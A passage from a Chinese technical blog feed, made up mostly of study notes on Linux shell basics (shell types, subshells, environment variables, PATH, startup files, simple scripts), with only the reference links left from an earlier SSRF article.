href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>![屏幕截图 2023-03-22 101713](..&#x2F;images&#x2F;屏幕截图 2023-03-22 101713.png)</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.wangan.com/articles/1238#59315b">https://www.wangan.com/articles/1238#59315b</a></p><p><a href="https://zhuanlan.zhihu.com/p/112055947">https://zhuanlan.zhihu.com/p/112055947</a></p><p><a href="https://joychou.org/web/phpssrf.html#directory0811578052187574410">https://joychou.org/web/phpssrf.html#directory0811578052187574410</a></p><p><a href="https://www.sqlsec.com/2021/05/ssrf.html">https://www.sqlsec.com/2021/05/ssrf.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>《Linux命令行与shell脚本编程大全》 笔记</title>
      <link href="/2023/05/31/linux-shell/"/>
      <url>/2023/05/31/linux-shell/</url>
      
        <content type="html"><![CDATA[<p>前言：</p><p>以下内容为阅读<code>Linux命令行与shell脚本编程大全.第3版 (布鲁姆，布雷斯纳汉) (z-lib.org)</code>笔记。</p><p>注：下面使用的linux系统为阿里云服务器Centos7（redhat）或者kali（debian）系统</p><hr><h1 id="了解shell"><a href="#了解shell" class="headerlink" title="了解shell"></a>了解shell</h1><h3 id="shell类型"><a href="#shell类型" class="headerlink" title="shell类型"></a>shell类型</h3><p><img src="/../images/image-20220818151112756-1686151304118.png" alt="image-20220818151112756"></p><blockquote><p>当用户登录终端的时候，通常会启动一个默认的交互式shell。</p><p>系统究竟启动哪个shell，这取决于用户ID配置系统启动什么样的shell程序。</p><p>在&#x2F;etc&#x2F;passwd文件中，在用户ID记录的第7个字段中列出了默认的shell程序。</p></blockquote><p>例如在kali中登录终端时使用的是zsh类型的shell.</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line"></span><br><span class="line">khaz: x:1000:1000:khaz,,,:/home/khaz:/usr/bin/zsh</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(khaz㉿kali)-[~/桌面]</span><br><span class="line">└─$ ls -F /usr/bin/zsh</span><br><span class="line">/usr/bin/zsh*</span><br></pre></td></tr></table></figure><p>说明&#x2F;usr&#x2F;bin&#x2F;zsh是一个可执行程序</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(khaz㉿kali)-[~/桌面]</span><br><span class="line">└─$ ls -l /bin/sh</span><br><span class="line">lrwxrwxrwx 1 root root 4  3月 14  2022 /bin/sh -&gt; dash</span><br></pre></td></tr></table></figure><p>可以发现用户和系统使用的shell类型不同。</p><p>查看所有shell</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ cat /etc/shells</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/etc/shells: valid login shells</span></span><br><span class="line">/bin/sh</span><br><span class="line">/bin/bash</span><br><span class="line">/usr/bin/bash</span><br><span class="line">/bin/rbash</span><br><span class="line">/usr/bin/rbash</span><br><span class="line">/bin/dash</span><br><span class="line">/usr/bin/dash</span><br><span class="line">/usr/bin/tmux</span><br><span class="line">/usr/bin/screen</span><br><span class="line">/bin/zsh</span><br><span class="line">/usr/bin/zsh</span><br></pre></td></tr></table></figure><blockquote><p>通常说的sh只是一个软连接，并不是真的有一个shell叫sh。</p><p>在debian系操作系统中，sh指向dash；</p><p>在centos系操作系统中，sh指向bash。</p></blockquote><h3 id="shell的父子关系"><a href="#shell的父子关系" class="headerlink" title="shell的父子关系"></a>shell的父子关系</h3><p><img src="/../images/image-20220819202328859-1686151304119.png" alt="image-20220819202328859"></p><p>在右边的命令行中可以看到bash进程的ppid就是&#x2F;user&#x2F;bin&#x2F;zsh的pid，所以二者是父子关系。</p><img src="E:\typora img\image-20220819202343322.png" alt="image-20220819202343322" style="zoom: 80%;" /><p>多次创建bash</p><img src="E:\typora img\image-20220819203036919.png" alt="image-20220819203036919" style="zoom: 67%;" /><img src="E:\typora img\image-20220819203046906.png" alt="image-20220819203046906" style="zoom:67%;" /><p>退出当前shell，<code>exit</code></p><img src="E:\typora img\image-20220819203202199.png" alt="image-20220819203202199" style="zoom:67%;" /><p>启动shell时的参数</p><img src="E:\typora img\image-20220923170946734.png" alt="image-20220923170946734" style="zoom:67%;" title=1/><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ bash -r</span><br><span class="line">khaz@DESKTOP-JCNAFF7:~$ cd ../</span><br><span class="line">bash: cd: restricted</span><br><span class="line">khaz@DESKTOP-JCNAFF7:~$</span><br></pre></td></tr></table></figure><h3 id="命令列表"><a href="#命令列表" class="headerlink" title="命令列表"></a>命令列表</h3><blockquote><p>以;隔开的多个命令</p></blockquote><p><code>pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls ; echo $BASH_SUBSHELL</code></p><p>进程列表</p><blockquote><p>创建一个子shell来执行命令列表</p></blockquote><p><code> (pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls ; echo $BASH_SUBSHELL)</code></p><p><code>echo $BASH_SUBSHELL</code>：输出子shell数量</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]#  (pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls ; echo $BASH_SUBSHELL)</span><br><span class="line">/root</span><br><span class="line">H1ve  web</span><br><span class="line">/etc</span><br><span class="line">/root</span><br><span class="line">H1ve  web</span><br><span class="line">1</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ( pwd ; echo $BASH_SUBSHELL)</span><br><span class="line">/root</span><br><span class="line">1</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ( pwd ;(echo $BASH_SUBSHELL))</span><br><span class="line">/root</span><br><span class="line">2</span><br></pre></td></tr></table></figure><p>可以看出有几个括号就有几个子shell</p><h1 id="使用linux环境变量"><a href="#使用linux环境变量" class="headerlink" title="使用linux环境变量"></a>使用linux环境变量</h1><ul><li><p>定义</p><blockquote><p><strong>存储有关shell会话和工作环境的信息的变量称为环境变量</strong></p></blockquote></li><li><p>分类</p><ul><li><p>全局变量</p></li><li><p>局部变量</p><blockquote><p>这里的范围指的是变量存在于哪些shell会话中</p></blockquote></li></ul></li></ul><h3 id="全局环境变量"><a href="#全局环境变量" class="headerlink" title="全局环境变量"></a>全局环境变量</h3><blockquote><p>系统环境变量基本上都是使用全大写字母，以区别于普通用户的环境变量。</p></blockquote><p>查看全局变量</p><ul><li><p><code>env</code> 或者<code>printenv</code>：<strong>只</strong>输出全部的<strong>全局</strong>变量</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# env  (printenv输出的与其相同)</span><br><span class="line">XDG_SESSION_ID=897</span><br><span class="line">HOSTNAME=izwz99bgx9y93dmv0mir0ez</span><br><span class="line">TERM=xterm</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">HISTSIZE=1000</span><br><span class="line">SSH_TTY=/dev/pts/0</span><br><span class="line">USER=root</span><br><span class="line">....</span><br></pre></td></tr></table></figure></li><li><p><code>printenv  var_name</code>或者 <code>echo $var_name</code>：输出特定变量的值。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# printenv USER</span><br><span class="line">root</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $USER</span><br><span class="line">root</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p>全局环境变量存在于所有的shell会话中</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# bash</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ps -f</span><br><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">root     11337 11335  0 20:14 pts/0    00:00:00 -bash</span><br><span class="line">root     11371 11337  0 20:31 pts/0    00:00:00 bash</span><br><span class="line">root     11382 11371  0 20:31 pts/0    00:00:00 ps -f</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $HOME</span><br><span class="line">/root</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# exit</span><br><span class="line">exit</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ps -f</span><br><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">root     11337 11335  0 20:14 pts/0    00:00:00 -bash</span><br><span class="line">root     11383 11337  0 20:32 pts/0    00:00:00 ps -f</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $HOME</span><br><span class="line">/root</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>在这个例子中，用bash命令生成一个子shell后，显示了HOME环境变量的当前值，这个值和父shell中的一模一样，都是&#x2F;root。</p></blockquote><h3 id="局部环境变量"><a href="#局部环境变量" class="headerlink" title="局部环境变量"></a>局部环境变量</h3><p>查看局部变量</p><blockquote><p>在Linux系统并没有一个只显示局部环境变量的命令。</p></blockquote><ul><li><p><code>set</code></p><blockquote><p>set命令会显示为某个特定进程设置的所有环境变量，包括局部变量、全局变量以及用户定义变量。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# set</span><br><span class="line">BASH=/bin/bash</span><br><span class="line">BASHOPTS=checkwinsize:cmdhist:expand_aliases:extquote:force_fignore:histappend:hostcomplete:interactive_comments:login_shell:progcomp:promptvars:sourcepath</span><br><span class="line">BASH_ALIASES=()</span><br><span class="line">BASH_ARGC=()</span><br><span class="line">BASH_ARGV=()</span><br><span class="line">BASH_CMDS=()</span><br><span class="line">BASH_LINENO=()</span><br><span class="line">BASH_SOURCE=()</span><br><span class="line">BASH_VERSINFO=([0]=&quot;4&quot; [1]=&quot;2&quot; [2]=&quot;46&quot; [3]=&quot;2&quot; [4]=&quot;release&quot; [5]=&quot;x86_64-redhat-linux-gnu&quot;)</span><br><span class="line">BASH_VERSION=&#x27;4.2.46(2)-release&#x27;</span><br><span class="line">COLUMNS=210</span><br><span class="line">DIRSTACK=()</span><br><span class="line">EUID=0</span><br><span class="line">GROUPS=()</span><br><span class="line">....</span><br></pre></td></tr></table></figure><blockquote><p>set命令会显示出全局变量、局部变量以及用户定义变量。它还会按照字母顺序对结果进行排序。</p><p>env和printenv命令同set命令的区别在于前两个命令不会对变量排序，也不会输出局部变量和用户定义变量。</p></blockquote></li></ul><h3 id="设置局部用户自定义变量"><a href="#设置局部用户自定义变量" class="headerlink" title="设置局部用户自定义变量"></a>设置局部用户自定义变量</h3><blockquote><p>一旦启动了bash shell（或者执行一个shell脚本），就能创建在这个shell进程内可见的局部变量了。</p><p>可以通过等号给环境变量赋值，值可以是数值或字符串。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $first_var</span><br><span class="line"></span><br><span class="line">注：因为没有定义first_var变量，所以输出为空。</span><br><span class="line"></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# $first_var=hello world</span><br><span class="line">-bash: =hello: command not found</span><br><span class="line">注：定义变量时无需加上$</span><br><span class="line"></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# first_var=hello world</span><br><span class="line">-bash: world: command not found</span><br><span class="line">注：在为变量赋值字符串时，如果字符串有引号，就需要用单引号括起来。</span><br><span class="line">引用：没有单引号的话，bash shell会以为下一个词是另一个要执行的命令</span><br><span class="line"></span><br><span class="line">root@izwz99bgx9y93dmv0mir0ez ~]# first_var =&#x27;hello world&#x27;</span><br><span class="line">-bash: first_var: command not found</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# first_var= &#x27;hello world&#x27;</span><br><span class="line">-bash: hello world: command not found</span><br><span class="line">注：变量和=和值之间不能有空格，否则shell会把其当成命令。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# first_var=&#x27;hello world&#x27;</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $first_var</span><br><span class="line">hello world</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>局部变量的范围</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ps -f</span><br><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">root     11337 11335  0 20:14 pts/0    00:00:00 -bash</span><br><span class="line">root     11415 11337  0 20:57 pts/0    00:00:00 ps -f</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# bash</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# child_var=&#x27;hello khaz&#x27;</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $child_var</span><br><span class="line">hello khaz</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# exit</span><br><span class="line">exit</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $child_var</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="设置全局变量"><a href="#设置全局变量" class="headerlink" title="设置全局变量"></a>设置全局变量</h3><blockquote><p>创建全局环境变量的方法是先<strong>创建</strong>一个局部环境变量，然后再把它<strong>导出</strong>到全局环境中。</p></blockquote><p><code>export var_name</code>：导出子shell的局部变量到全局环境中（<strong>临时修改</strong>）</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ps --forest</span><br><span class="line">  PID TTY          TIME CMD</span><br><span class="line">11566 pts/1    00:00:00 bash</span><br><span class="line">11585 pts/1    00:00:00  \_ ps</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# a=&#x27;khaz&#x27;</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# bash</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $a</span><br><span class="line"></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# exit</span><br><span class="line">exit</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# export a</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# bash</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $a</span><br><span class="line">khaz</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>我发现只能在登录终端的那个shell中export，不能在子shell中export？</p><p>因为export的作用是让子shell可以继承父shell导出过的变量。</p><p>并且如果在子shell中修改全局变量的值，也不会影响到父shell中该全局变量的值。</p></blockquote><h3 id="删除环境变量"><a href="#删除环境变量" class="headerlink" title="删除环境变量"></a>删除环境变量</h3><p><code>unset var_name</code>：删除环境变量</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# a=1</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $a</span><br><span class="line">1</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# unset a</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $a</span><br></pre></td></tr></table></figure><h3 id="设置PATH环境变量"><a href="#设置PATH环境变量" class="headerlink" title="设置PATH环境变量"></a>设置PATH环境变量</h3><blockquote><p>PATH环境变量定义了用于进行命令和程序查找的目录。</p></blockquote><p>下面演示了创建自定义命令，并可以在任何路径下使用该命令。</p><ul><li><p>创建自定义命令，命令内容为输出’hello khaz’，并将其移动到存放自定义命令的目录下</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# vim hello </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo &#x27;hello khaz&#x27;</span><br><span class="line">:wq</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# mkdir my_cmd</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# mv hello my_cmd/</span><br></pre></td></tr></table></figure></li><li><p>因为与命令不在同一路径下，提示找不到命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# hello</span><br><span class="line">-bash: hello: command not found</span><br></pre></td></tr></table></figure></li><li><p>查看并增加PATH（路径以：分隔）</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $PATH</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# PATH=$PATH:/root/my_cmd/</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $PATH</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin:/root/my_cmd/</span><br></pre></td></tr></table></figure></li><li><p>再次输入命令成功执行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# hello</span><br><span class="line">hello khaz</span><br></pre></td></tr></table></figure><blockquote><p>这种方法对PATH变量的修改只能持续到退出或重启系统。</p></blockquote></li></ul><h3 id="让环境变量的作用持久化"><a href="#让环境变量的作用持久化" class="headerlink" title="让环境变量的作用持久化"></a>让环境变量的作用持久化</h3><blockquote><p>把我们设置的环境变量放在shell的启动文件&#x2F;环境文件中。</p><p>或者开机启动项<code>/etc/init.d/</code>和<code>/etc/profile.d/</code></p></blockquote><ul><li><p>启动文件&#x2F;环境文件</p><blockquote><p>登入Linux系统启动一个bash shell时，默认情况下bash会在几个文件中查找命令。</p><p>这些文件叫作启动文件或环境文件。</p></blockquote></li><li><p>5个不同的启动文件</p><p> &#x2F;etc&#x2F;profile </p><p> $HOME&#x2F;.bash_profile </p><p> $HOME&#x2F;.bashrc </p><p> $HOME&#x2F;.bash_login </p><p> $HOME&#x2F;.profile </p></li><li><p>&#x2F;etc&#x2F;profile文件</p><blockquote><p>&#x2F;etc&#x2F;profile文件是bash shell默认的的主启动文件。</p><p>只要你登录了Linux系统，bash就会执行&#x2F;etc&#x2F;profile启动文件中的命令。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat /etc/profile</span><br><span class="line">.....</span><br><span class="line">.....</span><br><span class="line">for i in /etc/profile.d/*.sh ; do</span><br><span class="line">    if [ -r &quot;$i&quot; ]; then</span><br><span class="line">        if [ &quot;$&#123;-#*i&#125;&quot; != &quot;$-&quot; ]; then </span><br><span class="line">            . &quot;$i&quot;</span><br><span class="line">        else</span><br><span class="line">            . &quot;$i&quot; &gt;/dev/null</span><br><span class="line">        fi</span><br><span class="line">    fi</span><br><span class="line">done</span><br><span class="line">....</span><br><span class="line">....</span><br></pre></td></tr></table></figure><blockquote><p>其中的for语句为Linux系统提供了一个放置特定应用程序启动文件的地方，当用户登录时，shell会执行这些文件。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ls -al /etc/profile.d/</span><br><span class="line">total 64</span><br><span class="line">drwxr-xr-x.  2 root root 4096 Oct 15  2017 .</span><br><span class="line">drwxr-xr-x. 82 root root 4096 Sep 24 23:07 ..</span><br><span class="line">-rw-r--r--.  1 root root  123 Jul 31  2015 less.csh</span><br><span class="line">-rw-r--r--.  1 root root  121 Jul 31  2015 less.sh</span><br><span class="line">-rw-r--r--   1 root root  105 Aug  2  2017 vim.csh</span><br><span class="line">-rw-r--r--   1 root root  269 Aug  2  2017 vim.sh</span><br><span class="line">-rw-r--r--.  1 root root  164 Jan 28  2014 which2.csh</span><br><span class="line">-rw-r--r--.  1 root root  169 Jan 28  2014 which2.sh</span><br><span class="line">-rw-r--r--. 1 root root 1741 Feb 20 05:44 lang.csh </span><br><span class="line">-rw-r--r--. 1 root root 2706 Feb 20 05:44 lang.sh</span><br><span class="line">.....</span><br></pre></td></tr></table></figure><blockquote><p>不难发现，有些文件与系统中的特定应用有关。</p><p>大部分应用都会创建两个启动文件：一个供bash shell使用（使用.sh扩展名），一个供c shell使用（使用.csh扩展名）。</p><p>其中lang.csh和lang.sh文件是用来设置字符集的。</p></blockquote></li><li><p>$HOME目录下的启动文件</p><blockquote><p>这些启动文件都起着同一个作用：提供一个用户专属的启动文件来定义该用户所用到的环</p><p>境变量。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ls -a $HOME</span><br><span class="line">.  ..  .bash_history  .bash_logout  .bash_profile  .bashrc  .cache  cqhttp  .cshrc  H1ve  my_cmd  .pip  .pki  .pydistutils.cfg  .ssh  .tcshrc  .viminfo  .viminfo.tmp  web</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat $HOME/.bash_profile</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">.bash_profile</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Get the aliases and <span class="built_in">functions</span></span></span><br><span class="line">if [ -f ~/.bashrc ]; then</span><br><span class="line">. ~/.bashrc</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">User specific environment and startup programs</span></span><br><span class="line"></span><br><span class="line">PATH=$PATH:$HOME/bin</span><br><span class="line"></span><br><span class="line">export PATH</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>这里先会判断.bashrc文件是否存在，若存在先执行这个文件。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat .bashrc </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">.bashrc</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">User specific aliases and <span class="built_in">functions</span></span></span><br><span class="line"></span><br><span class="line">alias rm=&#x27;rm -i&#x27;</span><br><span class="line">alias cp=&#x27;cp -i&#x27;</span><br><span class="line">alias mv=&#x27;mv -i&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Source global definitions</span></span><br><span class="line">if [ -f /etc/bashrc ]; then</span><br><span class="line">. /etc/bashrc</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里可以设置别名，比如我添加<code>alias la=&#39;ls -a&#39;</code>,重启shell后</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat ~/.bashrc </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">.bashrc</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">User specific aliases and <span class="built_in">functions</span></span></span><br><span class="line"></span><br><span class="line">alias rm=&#x27;rm -i&#x27;</span><br><span class="line">alias cp=&#x27;cp -i&#x27;</span><br><span class="line">alias mv=&#x27;mv -i&#x27;</span><br><span class="line">alias la=&#x27;ls -a&#x27;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Source global definitions</span></span><br><span class="line">if [ -f /etc/bashrc ]; then</span><br><span class="line">. /etc/bashrc</span><br><span class="line">fi</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# la</span><br><span class="line">.  ..  .bash_history  .bash_logout  .bash_profile  .bashrc  .cache  cqhttp  .cshrc  H1ve  my_cmd  .pip  .pki  .pydistutils.cfg  .ssh  .tcshrc  .viminfo  .viminfo.tmp  web</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><code>PATH=$PATH:$HOME/bin</code>则应该是登录shell后自动添加路径到PATH中</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">编辑为PATH=$PATH:$HOME/bin:$HOME/my_cmd</span><br><span class="line">重启shell后/source立即生效后</span><br><span class="line"></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $PATH</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin:/root/my_cmd</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# hello</span><br><span class="line">hello khaz</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="环境变量立即生效"><a href="#环境变量立即生效" class="headerlink" title="环境变量立即生效"></a>环境变量立即生效</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source xxx</span><br></pre></td></tr></table></figure><h3 id="环境变量特性"><a href="#环境变量特性" class="headerlink" title="环境变量特性"></a>环境变量特性</h3><blockquote><p>环境变量有一个很酷的特性就是，它们可作为数组使用。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# arrary=(1 2 3)</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $arrary</span><br><span class="line">1</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $arrary[1]</span><br><span class="line">1[1]</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $&#123;arrary[1]&#125;</span><br><span class="line">2</span><br></pre></td></tr></table></figure><p>在使用变量时最好将变量名用{}括起来，否则可能会解析错误。</p><h1 id="shell脚本编写"><a href="#shell脚本编写" class="headerlink" title="shell脚本编写"></a>shell脚本编写</h1><ol><li><p>创建shell脚本</p><blockquote><p>在创建shell脚本文件时，必须在文件的第一行指定要使用的shell。其格式为：<code>#!/bin/bash </code></p><p>在通常的shell脚本中，井号（#）用作注释行。shell并不会处理shell脚本中的注释行。然而，</p><p>shell脚本文件的第一行是个例外，#后面的惊叹号会告诉shell用哪个shell来运行脚本。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo hello world</span><br></pre></td></tr></table></figure></li><li><p>设置权限</p><p><code>sudo chmod +x file_name </code></p></li><li><p>运行脚本</p><ul><li>shell 脚本文件名</li><li>chmod +x 脚本文件名; 脚本文件名</li><li>. 脚本文件名</li><li>source 脚本文件名</li></ul></li></ol><p>脚本文件名如<code>./name.sh</code></p><img src="E:\typora img\20210321121053755.png" alt="在这里插入图片描述" style="zoom: 80%;" /><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><h4 id="定义与使用"><a href="#定义与使用" class="headerlink" title="定义与使用"></a>定义与使用</h4><blockquote><p>如果要用到变量，使用$；</p><p>如果要操作变量，不使用$。</p><p>这条规则的一个例外就是使用printenv显示某个变量的值。</p></blockquote><p>用到变量 → 用到变量的值</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo $a  #输出变量的值</span><br><span class="line">printenv PATH #用到变量的值，但不需要加$</span><br></pre></td></tr></table></figure><p>操作变量</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a=1 #定义变量</span><br><span class="line">export a #导出变量</span><br><span class="line">unset a #删除变量</span><br></pre></td></tr></table></figure><h4 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h4><p>能够让变量作为命令行参数</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $HOME</span><br><span class="line">/root</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ls $HOME</span><br><span class="line">H1ve  web</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ls /root</span><br><span class="line">H1ve  web</span><br></pre></td></tr></table></figure><p>内敛执行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat `ls`</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat $(ls)</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;读取当前目录的所有文件</span></span><br><span class="line">将ls的输出作为cat的输入进行执行。</span><br></pre></td></tr></table></figure><blockquote><p>先执行的命令是由当前shell创建的子shell执行的。</p></blockquote><p>加上{}用于区分变量</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# a=b</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $ab</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">因为找不到变量ab，所以输出为空</span></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $&#123;a&#125;b</span><br><span class="line">bb</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>当变量值含有空格时，就要加上引号。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# b= world</span><br><span class="line">-bash: world: command not found</span><br></pre></td></tr></table></figure><p>单引号：不能解析变量，只会原样输出</p><p>双引号：能够解析变量</p><ul><li>获取字符串长度   &#96;$</li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计基础</title>
